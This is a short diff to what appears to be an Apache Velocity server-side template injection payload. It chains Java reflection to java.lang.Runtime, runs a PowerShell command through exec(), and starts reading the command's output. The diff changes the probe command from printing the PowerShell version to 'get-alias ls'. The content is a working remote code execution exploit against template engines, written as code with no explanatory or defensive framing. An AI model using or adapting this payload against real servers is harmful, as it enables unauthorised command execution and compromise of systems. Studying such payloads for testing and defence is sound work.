@@ -1,5 +1,5 @@
 #set ($exp="test")
-#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("powershell $PSVersionTable.PSVersion"))
+#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("powershell -command \"get-alias ls\""))
 #set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
 #set($sc = $exp.getClass().forName("java.util.Scanner"))
 #set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
